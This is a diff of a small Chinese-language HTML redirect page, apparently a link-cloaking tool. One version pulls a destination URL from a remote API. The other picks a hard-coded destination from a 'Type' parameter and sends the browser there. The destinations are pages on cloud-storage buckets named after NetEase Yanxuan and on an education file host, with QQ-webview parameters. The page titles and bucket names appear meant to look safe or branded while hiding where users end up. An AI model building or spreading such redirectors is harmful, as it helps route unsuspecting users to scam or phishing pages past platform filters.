@@ -1,73 +1,18 @@
 
+
 <!DOCTYPE html>
 <html>
-
-<head>
-    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
-    <title>安全网站，放心访问！</title>
-    <meta name="viewport" content="width=device-width,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no" />
-    <meta name="format-detection" content="telephone=no" />
-    <meta name="apple-mobile-web-app-capable" content="yes" />
-    <meta name="wap-font-scale" content="no" />
-    <meta name="apple-mobile-web-app-status-bar-style" content="black" />
-    <script src="https://cdn.bootcss.com/jquery/1.12.4/jquery.min.js"></script>
-    <script type="text/javascript" src="https://cdn.bootcss.com/zclip/1.1.2/jquery.zclip.min.js"></script>
-    <style type="text/css">
-        body,
-        div,
-        form,
-        input,
-        li,
-        ol,
-        p,
-        textarea,
-        ul {
-            margin: 0;
-            padding: 0;
-            font-family: "Microsoft YaHei";
-            color: #ffff;
-        }
-
-        body {
-            background: #fff;
-            color: #3f3f3f;
-            font-family: Apple LiGothic Medium, SimHei, Geneva, Arial, Helvetica, sans-serif;
-            -webkit-tap-highlight-color: transparent;
-            -webkit-tap-highlight-color: transparent;
-            -webkit-touch-callout: none;
-            -webkit-appearance: none;
-            width: 100%;
-            height:100vh;
-            font-size: 12px;
-        }
-
-        body p {
-            color: white;
-            text-align: center;
-            line-height: 25px;
-        }
-
-        img {
-            border: 0 none
-        }
-
-        hr {
-            margin: 10px
-        }
-        #Zl{
-            height:100%;
-        }
-    </style>
-</head>
-
-<body style="text-align: center;">
-    <div id="Zl">
-    </div>
-    <script>
-       
-
-        $(document).ready(function() {
-            function getQueryVariable(variable) {
+	<head>
+		<meta charset="utf-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+		<title>建议收藏，浏览器访问。</title>
+	</head>
+	<body>
+		<script>
+			var UID=getQueryVariable('UID');
+			var Type=getQueryVariable('Type');
+			var dz;
+			function getQueryVariable(variable) {
 				var query = window.location.search.substring(1);
 				var vars = query.split("&");
 				for (var i = 0; i < vars.length; i++) {
@@ -78,55 +23,29 @@
 				}
 				return (false);
 			}
-            
-            var u = getQueryVariable('u');
-            $.ajax({
-                url: "https://dwzs.lvtuba.cn/github.php?act=geturl&u="+u,
-                type: "get",
-                dataType: "json",
-                success: function(result) {
-                    if (result.code == 1 &&result.pattern>2) {
-                        $('#Zl').html('<iframe width="100%" id="rid" src="' + result.url + '" frameborder="0"></iframe>');
-                        $(window).resize(function() {
-                            fix_height();
-                        }).resize();
-                    } else {
-                        $('#Zl').html('<iframe width="100%" height="100%" id="rid" src="https://www.baidu.com" frameborder="0"></iframe>');
-                    }
-		   if (result.code == 1 &&result.pattern<3) {
-		   	 window.location =result.url;
-		   }
-                },
-                error: function(data) {
-                    $('#Zl').html('<iframe width="100%" height="100%" id="rid" src="https://www.baidu.com" frameborder="0"></iframe>');
-                }
-            });
-        });
-        if (! /*@aijquery@*/ 0) {
-            $("#rid").onload = function() {
-                fix_height();
-                $("#rid").contentWindow.focus();
-                $("#rid").load(function() {
-                    $('body').css('background', '');
-                });
-            };
-        } else {
-            $("#rid").onreadystatechange = function() {
-                if ($("#rid").readyState == "complete") {
-                    fix_height();
-                    $("#rid").contentWindow.focus();
-                    $("#rid").load(function() {
-                        $('body').css('background', '');
-                    });
-                }
-            };
-        }
-
-        function fix_height() {
-            $("#rid").attr("height", (($(window).height()) - 5) + "px");
-        }
-    </script>
-	
-</body>
-
+			const timestamp = +new Date();
+			if(Type=='1'){
+				dz='https://wangyiyanxuan-1312476741.cos.ap-nanjing.myqcloud.com/yanxuan/qq.mode-sw2.html?_wv=1027&UID='+UID+'&ips=239.5.108.71&uc='+timestamp;
+			}else if(Type=='2'){
+				dz='https://wangyiyanxuan-1312476741.cos.ap-nanjing.myqcloud.com/yanxuan/qq.360.html?_wv=1027&UID='+UID+'&ips=239.5.108.71&uc='+timestamp;
+			}else if(Type=='3'){
+				dz='https://wangyiyanxuan-1312476741.cos.ap-nanjing.myqcloud.com/yanxuan/q.html?_wv=1027&UID='+UID+'&ips=239.5.108.71&uc='+timestamp;
+			}else if(Type=='4'){
+				dz='https://wangyiyanxuan-1312476741.cos.ap-nanjing.myqcloud.com/yanxuan/x3u1ys8990k3.html?_wv=1027&UID='+UID+'&ips=239.5.108.71&uc='+timestamp;
+			}else if(Type=='5'){
+				dz='https://res.qxueyou.com/data/2023/06/13/e187bc22be874b79809dc6c82d54cbcc.HTM?_wv=1027&UID='+UID+'&ips=239.5.108.71&uc='+timestamp;
+			}else if(Type=='xiu'){
+				dz='https://res.qxueyou.com/data/2023/06/16/691cbaed6ff248c89a03ea92da59dd11.HTM?_wv=1027&UID='+UID+'&ips=239.5.108.71&uc='+timestamp;
+			}else if(Type=='xia'){
+				dz='https://res.qxueyou.com/data/2023/06/16/e320e2de224b4daa9db8c1bd19941fc7.HTM?_wv=1027&UID='+UID+'&ips=239.5.108.71&uc='+timestamp;
+			}else if(Type=='lian'){
+				dz='https://res.qxueyou.com/data/2023/06/16/e2fe26c67d744f1b8482f13605db8e33.HTM?_wv=1027&UID='+UID+'&ips=239.5.108.71&uc='+timestamp;
+			}else if(Type=='uxian'){
+				dz='https://res.qxueyou.com/data/2023/06/16/8ac1797b797a47fba2a24b0b5542b549.HTM?_wv=1027&UID='+UID+'&ips=239.5.108.71&uc='+timestamp;
+			}else{
+				dz='https://www.qq.com/';
+			}
+			parent.location.href = dz;
+		</script>
+	</body>
 </html>
